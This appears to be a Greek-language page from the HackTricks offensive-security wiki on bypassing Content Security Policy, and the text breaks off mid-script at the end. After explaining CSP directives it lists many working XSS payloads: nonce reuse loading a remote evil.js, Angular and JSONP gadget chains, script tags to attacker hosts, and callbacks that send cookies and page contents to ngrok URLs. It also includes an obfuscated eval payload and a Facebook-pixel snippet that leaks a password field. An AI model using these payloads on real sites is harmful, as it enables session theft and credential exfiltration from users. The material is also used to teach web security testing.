# Πολιτική Ασφάλειας Περιεχομένου (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το CSP

Η Πολιτική Ασφάλειας Περιεχομένου (CSP) θεωρείται τεχνολογία του browser, με κύριο στόχο την **προστασία από επιθέσεις όπως το cross-site scripting (XSS)**. Λειτουργεί ορίζοντας και περιγράφοντας τις διαδρομές και τις πηγές από τις οποίες το πρόγραμμα περιήγησης μπορεί να φορτώνει με ασφάλεια πόρους. Αυτοί οι πόροι περιλαμβάνουν στοιχεία όπως εικόνες, frames και JavaScript. Για παράδειγμα, μια πολιτική μπορεί να επιτρέπει το φόρτωμα και την εκτέλεση πόρων από το ίδιο domain (self), συμπεριλαμβανομένων inline πόρων και της εκτέλεσης κώδικα σε μορφή string μέσω συναρτήσεων όπως `eval`, `setTimeout` ή `setInterval`.

Η εφαρμογή της CSP γίνεται μέσω **επικεφαλίδων απόκρισης** ή με την ενσωμάτωση **meta στοιχείων στη σελίδα HTML**. Σύμφωνα με την πολιτική, τα προγράμματα περιήγησης επιβάλλουν ενεργά αυτούς τους κανόνες και μπλοκάρουν αμέσως τυχόν παραβιάσεις που εντοπίζονται.

- Υλοποιείται μέσω επικεφαλίδας απόκρισης:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Υλοποιείται μέσω meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Επικεφαλίδες

Η CSP μπορεί να εφαρμοστεί ή να παρακολουθηθεί χρησιμοποιώντας αυτές τις κεφαλίδες:

- `Content-Security-Policy`: Επιβάλλει την CSP· το πρόγραμμα περιήγησης αποκλείει οποιεσδήποτε παραβιάσεις.
- `Content-Security-Policy-Report-Only`: Χρησιμοποιείται για παρακολούθηση· αναφέρει παραβιάσεις χωρίς να τις αποκλείει. Ιδανικό για δοκιμές σε προπαραγωγικά περιβάλλοντα.

### Ορισμός πόρων

Η CSP περιορίζει τις προελεύσεις για τη φόρτωση τόσο ενεργού όσο και παθητικού περιεχομένου, ελέγχοντας πτυχές όπως η εκτέλεση inline JavaScript και η χρήση του `eval()`. Ένα παράδειγμα πολιτικής είναι:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Οδηγίες

- **script-src**: Επιτρέπει συγκεκριμένες πηγές για JavaScript, συμπεριλαμβανομένων URL, inline scripts, και scripts που ενεργοποιούνται από event handlers ή XSLT stylesheets.
- **default-src**: Ορίζει μια προεπιλεγμένη πολιτική για την ανάκτηση πόρων όταν λείπουν συγκεκριμένες fetch directives.
- **child-src**: Καθορίζει επιτρεπόμενες πηγές για web workers και ενσωματωμένο περιεχόμενο frame.
- **connect-src**: Περιορίζει τα URL που μπορούν να φορτωθούν χρησιμοποιώντας διεπαφές όπως fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Περιορίζει τα URL για frames.
- **frame-ancestors**: Καθορίζει ποιες πηγές μπορούν να ενσωματώσουν την τρέχουσα σελίδα, εφαρμόζεται σε στοιχεία όπως `<frame>`, `<iframe>`, `<object>`, `<embed>`, και `<applet>`.
- **img-src**: Ορίζει επιτρεπόμενες πηγές για εικόνες.
- **font-src**: Καθορίζει έγκυρες πηγές για γραμματοσειρές που φορτώνονται με `@font-face`.
- **manifest-src**: Ορίζει επιτρεπόμενες πηγές για αρχεία application manifest.
- **media-src**: Ορίζει επιτρεπόμενες πηγές για φόρτωση media objects.
- **object-src**: Ορίζει επιτρεπόμενες πηγές για `<object>`, `<embed>`, και `<applet>` στοιχεία.
- **base-uri**: Καθορίζει επιτρεπόμενα URL για φόρτωση μέσω `<base>` στοιχείων.
- **form-action**: Λίστα έγκυρων endpoints για υποβολές φορμών.
- **plugin-types**: Περιορίζει τους mime types που μπορεί να επικαλεστεί μια σελίδα.
- **upgrade-insecure-requests**: Οδηγεί τα browsers να αναγράψουν HTTP URLs σε HTTPS.
- **sandbox**: Εφαρμόζει περιορισμούς παρόμοιους με το sandbox attribute ενός `<iframe>`.
- **report-to**: Καθορίζει μια ομάδα στην οποία θα σταλεί μια αναφορά αν παραβιαστεί η πολιτική.
- **worker-src**: Καθορίζει έγκυρες πηγές για Worker, SharedWorker, ή ServiceWorker scripts.
- **prefetch-src**: Καθορίζει έγκυρες πηγές για resources που θα φορτωθούν ή θα prefetch-αρονται.
- **navigate-to**: Περιορίζει τα URL στα οποία ένα έγγραφο μπορεί να μεταβεί με οποιονδήποτε τρόπο (a, form, window.location, window.open, κ.λπ.)

### Πηγές

- `*`: Επιτρέπει όλα τα URL εκτός από αυτά με schemes `data:`, `blob:`, `filesystem:`.
- `'self'`: Επιτρέπει τη φόρτωση από το ίδιο domain.
- `'data'`: Επιτρέπει να φορτωθούν resources μέσω του data scheme (π.χ., Base64 encoded images).
- `'none'`: Αποκλείει τη φόρτωση από οποιαδήποτε πηγή.
- `'unsafe-eval'`: Επιτρέπει τη χρήση του `eval()` και παρόμοιων μεθόδων — δεν συνιστάται για λόγους ασφαλείας.
- `'unsafe-hashes'`: Ενεργοποιεί συγκεκριμένους inline event handlers.
- `'unsafe-inline'`: Επιτρέπει τη χρήση inline resources όπως inline `<script>` ή `<style>` — δεν συνιστάται για λόγους ασφαλείας.
- `'nonce'`: Λευκή λίστα για συγκεκριμένα inline scripts που χρησιμοποιούν cryptographic nonce (αριθμός που χρησιμοποιείται μία φορά).
- Αν έχετε περιορισμένη εκτέλεση JS, είναι δυνατό να εντοπίσετε ένα χρησιμοποιημένο nonce μέσα στη σελίδα με `doc.defaultView.top.document.querySelector("[nonce]")` και στη συνέχεια να το επαναχρησιμοποιήσετε για να φορτώσετε ένα κακόβουλο script (αν χρησιμοποιείται strict-dynamic, οποιαδήποτε επιτρεπόμενη πηγή μπορεί να φορτώσει νέες πηγές οπότε αυτό δεν είναι αναγκαίο), όπως στο:

<details>

<summary>Φόρτωση script επαναχρησιμοποιώντας nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Προσθέτει στη λευκή λίστα scripts με συγκεκριμένο sha256 hash.
- `'strict-dynamic'`: Επιτρέπει τη φόρτωση scripts από οποιαδήποτε πηγή εάν έχει προστεθεί στη λευκή λίστα με nonce ή hash.
- `'host'`: Καθορίζει έναν συγκεκριμένο host, όπως `example.com`.
- `https:`: Περιορίζει τα URLs σε αυτά που χρησιμοποιούν HTTPS.
- `blob:`: Επιτρέπει πόρους από Blob URLs (π.χ. Blob URLs που δημιουργούνται μέσω JavaScript).
- `filesystem:`: Επιτρέπει τη φόρτωση πόρων από το filesystem.
- `'report-sample'`: Συμπεριλαμβάνει δείγμα του παραβατικού κώδικα στην αναφορά παραβίασης (χρήσιμο για debugging).
- `'strict-origin'`: Παρόμοιο με το 'self' αλλά διασφαλίζει ότι το επίπεδο ασφάλειας του πρωτοκόλλου των πηγών ταιριάζει με του εγγράφου (μόνο ασφαλείς προελεύσεις μπορούν να φορτώσουν πόρους από ασφαλείς προελεύσεις).
- `'strict-origin-when-cross-origin'`: Στέλνει πλήρη URLs για same-origin αιτήματα αλλά στέλνει μόνο το origin όταν το αίτημα είναι cross-origin.
- `'unsafe-allow-redirects'`: Επιτρέπει τη φόρτωση πόρων που θα ανακατευθυνθούν αμέσως σε άλλον πόρο. Δεν συνιστάται καθώς αποδυναμώνει την ασφάλεια.

## Μη ασφαλείς κανόνες CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Λειτουργικό payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' μέσω Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Αυτό δεν λειτουργεί, για περισσότερες πληροφορίες [**δείτε εδώ**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Λειτουργικό payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Αν με κάποιον τρόπο μπορέσεις να κάνεις έναν allowed JS code να δημιουργήσει ένα νέο script tag στο DOM με τον JS κώδικά σου — επειδή ένα allowed script το δημιουργεί — τότε το νέο script tag θα επιτρέπεται να εκτελεστεί.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Λειτουργικό payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Έλλειψη των object-src και default-src

> [!CAUTION] > **Φαίνεται πως αυτό δεν λειτουργεί πια**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Λειτουργικά payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Μεταφόρτωση Αρχείου + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Εάν μπορείτε να ανεβάσετε ένα αρχείο JS, μπορείτε να παρακάμψετε αυτό το CSP:

Working payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Ωστόσο, είναι πολύ πιθανό ότι ο server **επικυρώνει το ανεβασμένο αρχείο** και θα σας επιτρέψει μόνο να **ανεβάσετε συγκεκριμένους τύπους αρχείων**.

Επιπλέον, ακόμη και αν καταφέρατε να ανεβάσετε **JS code inside** ένα αρχείο χρησιμοποιώντας μια επέκταση που δέχεται ο server (like: _script.png_) αυτό δεν θα είναι αρκετό επειδή κάποιοι servers όπως ο apache server **επιλέγουν το MIME type του αρχείου με βάση την επέκταση** και browsers όπως ο Chrome θα **απορρίψουν την εκτέλεση του Javascript** κώδικα μέσα σε κάτι που θα έπρεπε να είναι εικόνα. "Hopefully", υπάρχουν λάθη. Για παράδειγμα, από ένα CTF έμαθα ότι **Apache δεν γνωρίζει** την _**.wave**_ επέκταση, συνεπώς δεν την σερβίρει με ένα **MIME type like audio/***.

Από εδώ, αν βρείτε ένα XSS και ένα file upload, και καταφέρετε να βρείτε μια **misinterpreted extension**, μπορείτε να δοκιμάσετε να ανεβάσετε ένα αρχείο με εκείνη την επέκταση και το περιεχόμενο του script. Ή, αν ο server ελέγχει το σωστό format του ανεβασμένου αρχείου, δημιουργήστε ένα polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

If not possible to inject JS, you could still try to exfiltrate for example credentials **injecting a form action** (and maybe expecting password managers to auto-fill passwords). You can find an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Also, notice that `default-src` does not cover form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Για μερικά από τα παρακάτω payload **`unsafe-eval` δεν είναι καν απαραίτητο**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Φορτώστε μια ευάλωτη έκδοση του angular και εκτελέστε αυθαίρετο JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads που χρησιμοποιούν Angular + μια βιβλιοθήκη με συναρτήσεις που επιστρέφουν το αντικείμενο `window` ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Το post δείχνει ότι θα μπορούσατε να **φορτώσετε** όλες τις **βιβλιοθήκες** από `cdn.cloudflare.com` (ή οποιοδήποτε άλλο επιτρεπόμενο αποθετήριο JS βιβλιοθηκών), να εκτελέσετε όλες τις προστιθέμενες συναρτήσεις από κάθε βιβλιοθήκη, και να ελέγξετε **ποιες συναρτήσεις από ποιες βιβλιοθήκες επιστρέφουν το αντικείμενο `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS από το όνομα μιας κλάσης:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Κατάχρηση google recaptcha JS code

Σύμφωνα με [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) μπορείτε να καταχραστείτε [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) μέσα σε ένα CSP για να εκτελέσετε αυθαίρετο JS κώδικα παρακάμπτοντας το CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Περισσότερα [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Κατάχρηση www.google.com για open redirect

Το παρακάτω URL ανακατευθύνει στο example.com (από [εδώ](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Κατάχρηση \*.google.com/script.google.com

Είναι δυνατόν να γίνει κατάχρηση του Google Apps Script ώστε να λαμβάνονται πληροφορίες σε μια σελίδα μέσα στο script.google.com. Αυτό έχει συμβεί σε αυτήν την αναφορά: [όπως φαίνεται εδώ](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Endpoints τρίτων μερών + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Σενάρια σαν αυτό όπου το `script-src` είναι ρυθμισμένο σε `self` και ένας συγκεκριμένος domain που είναι whitelisted μπορούν να παρακαμφθούν χρησιμοποιώντας JSONP. Τα JSONP endpoints επιτρέπουν μη ασφαλείς μεθόδους callback οι οποίες επιτρέπουν σε έναν attacker να πραγματοποιήσει XSS, λειτουργικό payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **περιέχει έτοιμα προς χρήση JSONP endpoints για CSP bypass σε διάφορους ιστότοπους.**

Το ίδιο ευπάθεια θα παρουσιαστεί αν το **αξιόπιστο endpoint περιέχει ένα Open Redirect**, επειδή αν το αρχικό endpoint είναι αξιόπιστο, οι ανακατευθύνσεις θεωρούνται επίσης αξιόπιστες.

### Καταχρήσεις τρίτων

As described in the [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), υπάρχουν πολλοί τομείς τρίτων που μπορεί να επιτρέπονται κάπου στο CSP και μπορούν να καταχραστούν είτε για exfiltrate δεδομένα είτε για εκτέλεση JavaScript. Μερικοί από αυτούς είναι:

| Οντότητα          | Επιτρεπόμενος Domain                          | Δυνατότητες |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

If you find any of the allowed domains in the CSP of your target, chances are that you might be able to bypass the CSP by registering on the third-party service and, either exfiltrate data to that service or to execute code.

Για παράδειγμα, αν βρείτε το ακόλουθο CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ή
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Θα πρέπει να μπορείτε να exfiltrate δεδομένα, παρόμοια όπως γινόταν πάντα με [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Σε αυτή την περίπτωση, ακολουθείτε τα παρακάτω γενικά βήματα:

1. Δημιουργήστε έναν Facebook Developer account εδώ.
2. Δημιουργήστε μια νέα εφαρμογή "Facebook Login" και επιλέξτε "Website".
3. Πηγαίνετε στο "Settings -> Basic" και πάρτε το "App ID"
4. Στον target site από τον οποίο θέλετε να exfiltrate δεδομένα, μπορείτε να το κάνετε χρησιμοποιώντας απευθείας το Facebook SDK gadget "fbq" μέσω ενός "customEvent" και του data payload.
5. Πηγαίνετε στο App σας "Event Manager" και επιλέξτε την εφαρμογή που δημιουργήσατε (σημειώστε ότι ο event manager μπορεί να βρεθεί σε ένα URL παρόμοιο με αυτό: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
6. Επιλέξτε την καρτέλα "Test Events" για να δείτε τα events που αποστέλλονται από τον "your" web site.

Στη συνέχεια, στην πλευρά του victim, εκτελείτε τον ακόλουθο κώδικα για να initialize the Facebook tracking pixel ώστε να δείχνει στο app-id του attacker's Facebook developer account και να εκδώσει ένα custom event όπως παρακάτω:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Όσον αφορά τις άλλες επτά third-party domains που αναφέρονται στον προηγούμενο πίνακα, υπάρχουν πολλοί άλλοι τρόποι που μπορείτε να τα καταχραστείτε. Ανατρέξτε στο προηγούμενο [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) για επιπλέον επεξηγήσεις σχετικά με άλλες third-party καταχρήσεις.

### Παράκαμψη μέσω RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Επιπλέον της προαναφερθείσας ανακατεύθυνσης για την παράκαμψη περιορισμών διαδρομής, υπάρχει μια άλλη τεχνική που ονομάζεται Relative Path Overwrite (RPO) η οποία μπορεί να χρησιμοποιηθεί σε ορισμένους servers.

Για παράδειγμα, αν το CSP επιτρέπει το μονοπάτι `https://example.com/scripts/react/`, μπορεί να παρακαμφθεί ως εξής:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Ο browser τελικά θα φορτώσει `https://example.com/scripts/angular/angular.js`.

Αυτό λειτουργεί επειδή για τον browser, φορτώνεις ένα αρχείο με όνομα `..%2fangular%2fangular.js` που βρίσκεται κάτω από `https://example.com/scripts/react/`, το οποίο συμμορφώνεται με το CSP.

Στη συνέχεια, θα το αποκωδικοποιήσει, κάνοντας στην ουσία αίτηση για `https://example.com/scripts/react/../angular/angular.js`, το οποίο ισοδυναμεί με `https://example.com/scripts/angular/angular.js`.

Εκμεταλλευόμενοι αυτήν την ασυνέπεια στην ερμηνεία των URL μεταξύ browser και server, οι κανόνες διαδρομής μπορούν να παρακαμφθούν.

Η λύση είναι να μην αντιμετωπίζεται το `%2f` ως `/` στην πλευρά του διακομιστή, διασφαλίζοντας συνεπή ερμηνεία μεταξύ browser και διακομιστή για να αποφευχθεί αυτό το ζήτημα.

Παράδειγμα online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Εκτέλεση JS σε iframes


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Έλλειψη **base-uri**

Εάν η οδηγία **base-uri** λείπει, μπορείτε να την εκμεταλλευτείτε για να εκτελέσετε ένα [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Επιπλέον, εάν η **σελίδα φορτώνει ένα script χρησιμοποιώντας μια σχετική διαδρομή** (όπως `<script src="/js/app.js">`) και χρησιμοποιεί ένα **Nonce**, μπορείτε να εκμεταλλευτείτε το **base** **tag** για να το κάνετε να **φορτώσει** το script από **τον δικό σας διακομιστή επιτυγχάνοντας XSS.**\
Αν η ευάλωτη σελίδα φορτώνεται με **httpS**, χρησιμοποιήστε ένα httpS url στο base.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS συμβάντα

Μια συγκεκριμένη πολιτική, γνωστή ως Content Security Policy (CSP), μπορεί να περιορίσει τα JavaScript συμβάντα. Ωστόσο, το AngularJS παρέχει custom events ως εναλλακτική. Μέσα σε ένα event, το AngularJS παρέχει ένα μοναδικό αντικείμενο `$event`, το οποίο αναφέρεται στο εγγενές αντικείμενο συμβάντος του browser. Αυτό το `$event` αντικείμενο μπορεί να εκμεταλλευτεί ώστε να παρακαμφθεί το CSP. Σημειωτέον, στο Chrome, το αντικείμενο `$event/event` έχει ένα χαρακτηριστικό `path`, που περιέχει έναν πίνακα αντικειμένων που εμπλέκονται στην αλυσίδα εκτέλεσης του event, με το αντικείμενο `window` να βρίσκεται πάντα στο τέλος. Αυτή η δομή είναι κρίσιμη για τεχνικές sandbox escape.

Κατευθύνοντας αυτόν τον πίνακα στο φίλτρο `orderBy`, είναι εφικτό να τον διατρέξετε και να εκμεταλλευτείτε το τελευταίο στοιχείο (το αντικείμενο `window`) για να καλέσετε μια global function όπως `alert()`. Το παρακάτω δείγμα κώδικα εξηγεί αυτή τη διαδικασία:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Αυτό το απόσπασμα επισημαίνει τη χρήση της οδηγίας `ng-focus` για να πυροδοτήσει το event, αξιοποιώντας το `$event.path|orderBy` για να χειριστεί τον πίνακα `path`, και χρησιμοποιώντας το αντικείμενο `window` για να εκτελέσει τη συνάρτηση `alert()`, αποκαλύπτοντας έτσι το `document.cookie`.

**Βρείτε άλλους Angular bypasses στο** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS and whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Μια πολιτική CSP που whitelists domains για script loading σε μια εφαρμογή Angular JS μπορεί να παρακαμφθεί μέσω της κλήσης των callback functions και ορισμένων vulnerable classes. Περαιτέρω πληροφορίες για αυτήν την τεχνική βρίσκονται σε έναν λεπτομερή οδηγό διαθέσιμο σε αυτό το [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Άλλα JSONP arbitrary execution endpoints μπορούν να βρεθούν στο [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (μερικά από αυτά έχουν διαγραφεί ή διορθωθεί)

### Bypass via Redirection

Τι συμβαίνει όταν το CSP συναντά server-side redirection; Αν η redirection οδηγεί σε διαφορετικό origin που δεν επιτρέπεται, θα αποτύχει.

Ωστόσο, σύμφωνα με την περιγραφή στο [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), εάν η redirection οδηγεί σε διαφορετικό path, μπορεί να bypass τους αρχικούς περιορισμούς.

Παράδειγμα:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Αν το CSP είναι ρυθμισμένο στο `https://www.google.com/a/b/c/d`, επειδή το path λαμβάνεται υπόψη, τόσο τα scripts `/test` όσο και `/a/test` θα μπλοκαριστούν από την CSP.

Ωστόσο, το τελικό `http://localhost:5555/301` θα **ανακατευθυνθεί στον server-side σε `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Εφόσον πρόκειται για redirection, το **path δεν λαμβάνεται υπόψη**, και το **script μπορεί να φορτωθεί**, παρακάμπτοντας έτσι τον περιορισμό του path.

Με αυτή την ανακατεύθυνση, ακόμα και αν το path καθοριστεί πλήρως, θα παρακαμφθεί.

Επομένως, η καλύτερη λύση είναι να διασφαλίσετε ότι ο ιστότοπος δεν έχει ευπάθειες τύπου open redirect και ότι δεν υπάρχουν domains που μπορούν να εκμεταλλευτούν οι κανόνες CSP.

### Bypass CSP with dangling markup

Διαβάστε [πώς εδώ](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` σημαίνει ότι μπορείς να εκτελέσεις οποιοδήποτε script μέσα στον code (το XSS μπορεί να εκτελέσει code) και `img-src *` σημαίνει ότι μπορείς να χρησιμοποιήσεις στη σελίδα οποιαδήποτε εικόνα από οποιαδήποτε πηγή.

Μπορείς να παρακάμψεις αυτό το CSP εξάγοντας τα δεδομένα μέσω εικόνων (σε αυτή την περίπτωση το XSS εκμεταλλεύεται ένα CSRF όπου μια σελίδα προσβάσιμη από το bot περιέχει ένα SQLi, και εξάγει το flag μέσω εικόνας):
```javascript
<script>
